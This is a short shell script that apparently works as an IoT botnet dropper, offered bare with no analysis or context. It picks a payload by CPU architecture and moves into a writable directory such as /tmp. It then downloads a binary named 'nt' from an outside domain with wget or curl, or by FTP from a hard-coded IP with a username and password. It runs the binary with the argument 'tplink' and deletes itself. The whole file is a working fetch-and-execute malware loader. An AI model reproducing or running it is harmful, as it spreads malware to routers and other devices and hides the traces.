#!/bin/sh
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

ARCH=$(uname -m)
case "$ARCH" in
    *armv7*|*armv6*) BIN="nt.arm" ;;
    *aarch64*|*arm64*) BIN="nt.arm64" ;;
    *mips64*) BIN="nt.mips64" ;;
    *mipsel*|*mips*l) BIN="nt.mpsl" ;;
    *mips*) BIN="nt.mips" ;;
    *x86_64*) BIN="nt.x86_64" ;;
    *i386*|*i686*) BIN="nt.x86" ;;
    *ppc*|*powerpc*) BIN="nt.ppc" ;;
    *sh4*) BIN="nt.sh4" ;;
    *m68k*) BIN="nt.m68k" ;;
    *sparc*) BIN="nt.sparc" ;;
    *) BIN="nt.arm" ;;
esac

for dir in /tmp /var /dev/shm /mnt /data /var/tmp; do
    cd $dir && break
done

(wget http://hi.risesmp.xyz/$BIN -O nt || \
 curl -L http://hi.risesmp.xyz/$BIN -o nt || \
 ftpget -v -u goot -p 1lo2ey134251 5.223.61.123 nt $BIN)

chmod +x nt
./nt tplink &
sh nt tplink &

rm -f hi.sh
